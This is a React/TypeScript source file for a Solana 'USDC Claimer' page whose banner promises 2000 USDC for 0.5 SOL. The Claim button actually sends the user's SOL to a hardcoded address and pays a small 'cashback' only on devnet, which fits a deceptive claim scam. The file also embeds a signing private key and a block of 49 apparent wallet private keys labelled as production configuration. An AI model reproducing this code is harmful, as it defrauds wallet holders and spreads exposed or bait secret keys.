/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "38gvzV6N3Qc6vpW8Kdud73rEC6e7q8r2uwuzjTY6vQBFxXYK1qMRXpS7iC8c9vSeeA4xJPtVYEpDnxFTChda62mP"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "Df7UfwBSGH8W3eaWitSs8KA3PTtnM94NStUa4q6U5839RpEU5KGYaYzfP7kQvtPqEbcwmJNSdwMH1s9HjUuMtca",
  "key1": "3Gou63T4tMwhXUih7ppXeJ3GbSf2eefxddm2NGkLpP9UYbcVN9ehsNdRuceWGb9yzsdRgm8zhrXKR6c4pw7cBMsZ",
  "key2": "5XohHyuYBfJfqCc99ajMRFbE1L51gy4HzcLcgrJqwZaJKSqwVTekaDBdwwekJb8Vr4Zp5xFrkbRcZeXsocBAT8E3",
  "key3": "29RD7XJpHgU7fyzQrzqEQVDpQHVjW7Edrvos2e8ySZ7wvQCJwBSZxdCneYyu1CrPeK4hwuXpiS1P8EseCaQWNmTp",
  "key4": "4WqK3gknL2XLLm7D44azELK9avyduHHytwLtQQ6m89HbswqsJokoqEhwgCqGqb7qwvrXZXmGJWPqqc7PcrCmN45F",
  "key5": "vPqv2Ki1XkPsZqnYZhKghX1aZJE8KUZZeVqspqv4mwNTWaH3yPQCmoMgVUZTcmNaYkRjxNyxQrwQRWjkSGCcE2s",
  "key6": "3H1pfirgJwBYKv6yhKQCrFJ98NbVZrsk55ZUtMJjcPhTtNsM4hKsLxvzFprfL4KTMxHu4E2qUNEEBiQfymosRERe",
  "key7": "2b4nqQZ7FSknR9UkmvP7KDSD3aYYY9uva5APDpNBZxunHhGwWRZ9rV7hqCigiwMLxnBWRG7ppoKobTv46hdSSJu",
  "key8": "8AaTY2WEURyfKQsc34YGsyjKjx5MamGYe2ygqGrk8snFpH2MQbxbRFbq5MqSQL9Vuhfv5jWu5gdPSPmHaeegeCW",
  "key9": "5RacVt9HHYcizwW2yb3KxcQjLqfGz7bB4Gs9xF6xb8UkkeajkM2bAm1o65YJWK7ztr8b9WbkJxgnFWMJXhFkRfZ9",
  "key10": "4SKXrmGH6aMdsAzqDJvf3hBkgsHgaMF95NzX4JbyEQmgcERDLr3Et7cbJfn2XqLucpE3SGbAKzipVh9TL8DPggx4",
  "key11": "wgaJbFSGE4HbAvg9vrXokX5mgfK4qwPys6aTD76VyLNau73JF6mVMwkAcvnsaJUXscCNuS6LnpPdNW6Z4yLkW8W",
  "key12": "5E7ZaGXaxjmqd59EAPKdtB3Fcv5ug8RGweN84fFuZBdWyveVP84VC5bqZpRTHsJP2K7cCj3dPThxUbqehQnoVM9k",
  "key13": "MqrkUrw3rpjaDH2tXispYZCfXqxrLcP6ZPTgrKvHaKoze4mfVK7FNz8kVVPutBsuKkJeNgFkMnrLwevPgEGhjc7",
  "key14": "2A1jrUUgJnUFos5xS5A2zmKEZYHXy9QD7q8akS2fK3zYHoXW7frPGpBdpUmqxEvau1inZ5xmwcuypzdNRPphSBU9",
  "key15": "5sywjDzXTHTtApTn2GjFqKgxBDfkrDcLmbWDw6WXBhmxXdFUVtJEuTZqJinFXzMs3Uj3G3TSeDACfvgpvNAXVesD",
  "key16": "3tSVigjXdkFxvWYPWrC188D3NXEgags3nzWm9RkF7bCftxXwzEfdWrPY1v5FSkFucW6SRoVR3h6NEQmBsBstBW6X",
  "key17": "3bHEXGPCNEGcPJDMipeKmrmF21wzk2qP8JeQcSUKhSmnDJVHyKCp9Agma59nWWFpENf8R1TZkfZnACKDDLYFPY8j",
  "key18": "5EH6dgsZW7whfHecSwDBhrKpJFc77rBwXZ6JiBsfck8sf3JEcyEjoU95V2WcZyEnNXNrtkuGTqKfqg3Grmm99Crr",
  "key19": "5Xu8x5inSP3v5ZFvdEEUnWW62DXi7Bn3wWXcwhsDqoVoVz7eo8aCNnSt6hzBZWj7oEAADbfSAbJP5VfmcssQwXQE",
  "key20": "3uEbCWEHGcLvsVv7iTAtLoWyZtYWV1tRo2HetNgmhJvRWVxNvTiyCHNyZJQFPMtrcgvWocPHQcimvoaTn14nEX9w",
  "key21": "5o1n28wVzYTMV13Yub5X7YQAyNH1VsE3kkgUQVB6JzKkw3CrmQN21NS2EVQTDESqGm8FW4XEWiiE4nP9ZidVX2UU",
  "key22": "4ez29UAz4uVjMM5FfarxQKtcin7htttEFkyw4pGVmPBgUS8K4KQTHLdcPCrWjNPWaedgLAhwLF9i1YxvfA3eHpHa",
  "key23": "65DyxnYF1o8dx7TPUpWurAtoUuqQqZYzxgg7FYMpoRommQhCJe2usxpv79VfXo9dyyZLvco4F5dNDVsKUKnTNHWh",
  "key24": "5iTQajJkGaHWGR34d5im1MZ7VQVJMX3fDCBELgScSskdJbU8FALfyUwkot5f9GQANDYfypqUoCZGkzjMSmsew3HS",
  "key25": "3v4gT9kEog7TbACSGDnFzLqbJ5YdsxLJSo6cg9eC13SoqgQ7RG3MwMAf3WfAQJJnSQg1WCAFnrBBNvPnpuWsm6BR",
  "key26": "2UKtZtQnF76kM3sLvaUC3bdSSMk2PXhD3SCor21L2HxmHTnzrAGVQfxUg6vk9EuwWyscAPa5c6xYr4mDNgRCtqm2",
  "key27": "3F4gbVYLkZU5SLNU6KudnUy19sQpjR9cghubZPMA8VKwJeuvSxpi7tQGj3vucnDcSMptbBjZNYtrri7W5njhPZfa",
  "key28": "4BS5rWoGSJoBofYaABJCoPugtkk2YMUBLndqn5EcKEdpSqKK9nxKZ9VkjF5APtEL3LtJ3b66v6pw1La4Epeuv5da",
  "key29": "3zLjLeMjY3NZbhqnuxcjeUktUBU2V3WBf82GW71EMtsmDd4cGVNqxMW8QbtiLFyxkBV5i324qzQrSiTofDgT3MeN",
  "key30": "5T4Z7cVNtnrFYUzzAiPANdvHTphwMrD83WKhJcNetQUN9n9rWQybQ6hEX6ZKQ3L8tbASFvyXUCBK1DBVNrGJYwuX",
  "key31": "2HhHWi9RNztik19cgQixqDnqFcmaCTVS56p1AUbVzQ3pp6C359iW7uL94EbAzC3PX1bXWvqibnedWYG5fsF6qxoN",
  "key32": "4qQBXtSTFk7qvKRkWJCsV9J1atGpukQcQHQHqsxdk7ERmGDcGV3oHC2kkZBcVDkRrxoUoHsxnxQGyhPdJTSM5rXT",
  "key33": "j1sXg91cksPaeVKxYzbsvPRHJsutnPSPJvzF2KNVHuwGQomjtDFNfokpH6BCV6XJEkPb4A8Bfih9B4G5FutARbC",
  "key34": "51Knvxm2yZk9XLCnHZnqwCrXyn13UXh4tjitbLf5BbpTuiFMAMZsX89bja93D3dGK46j9Thofp9H1djmV655jGo5",
  "key35": "556BrrtsGCvcThKGj1C4Jm4LCVRT75XTyPs53QhGHR7RjLyHycPakehMfoqDGTkkjEncs3xpjpVSiKGz2joKjZVy",
  "key36": "LHKNEPPHbHbUmuEk335Lfu8eginWYx5rCB3xXm293pJY2jrSDfYhaAnpFzFSG37JgwbnVMnJfpQGMzHaCFFY5oW",
  "key37": "mYek5VLhcwZfjAzmBMvzSfYVTb32skHyz5TbUS3tGNrBHHX9mty1MNbU1dV8PYiWuMztAZ8RsZqcafNL2R37yy5",
  "key38": "yLg2dp2s4gSCqocgKTYaLMvmLDG15MbjACkGS4mj6n68R4xcoDb6J1bkYgHSWzUdkXNwDryzyX8eQpnT6fvjzjX",
  "key39": "5DaTAhewzahhf8HYCzQ8S91VoxcNx5FwZLNjYD79xzX4xftrALfmuXwcK5EFabUWoiCWz8H9Nz9zBPGE7szdTDGu",
  "key40": "BCTE3BdMoX3YT7JifURUQUTKevjwuK4F1cUXWUmMQ6mULgXDRVbxuLhheyvt7dTp3yZn7L1w7W2rer1v5TDGkpx",
  "key41": "2N9Wtt5HsnVQ3x2jhfqaPUbvc39HrTAeUcSNUbpHRjneyk3YsgykZCmrT7vUL1ctUV9LB3FVY7c6ANvBYpMEWrDS",
  "key42": "55983BYGWwapc3PhhdKT5hVt53BxzLBa9gNRyV2d2Nx3SYMCUqvk4vpmjU3eFnCSgEeBEzCpEqRfsmr8dvE3Hr9b",
  "key43": "2CUZQ9n4Pv213xnFxTSKo44V9wwyd3WJ3UbidcsuSWjkRqnxqdm27wg96hiz1pexgyud6crgwnfYCQBrvhcgFpXu",
  "key44": "2uE6jphLrWdnZZfLn5XvvYCNYYAgVryoCvTBYXKESgV2fGJedXDt3XdWJmNeDNmXQezSVW2cCCZHf1ENW8TU8U6d",
  "key45": "2TGspRqU5ZjZowJTiwUg1BtyYeyanV2gQ6XEPes1BK6LnUjug8qzkLCmSWySqp7amyMFEQ9jTMkYuDAdEStR2ttX",
  "key46": "4UjHqmhpqi7RkNRPhZwzu8F2pLNhDaSf2MkqKkP6AjEZmZzfrRiyQyi43fEyAzhZ6mnv7SkSXsVRYqJzUMuXBUY4",
  "key47": "4D6DuybyDT1kZqJ9RGtTzhXHvE4KcTHbyscEzmx9PBXpGgzms4iTyLCdLacGZfdGeVFY9n7bvcLK8xKq4mgZ2oxW",
  "key48": "jWdParzCJnwoCtcbseu9JCo98YZGk4sAp7hNkgfJwL3AzTPCsQ4FdeeXNyBACwAacM7MkX9fr1dUz7T7h3naR9j"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
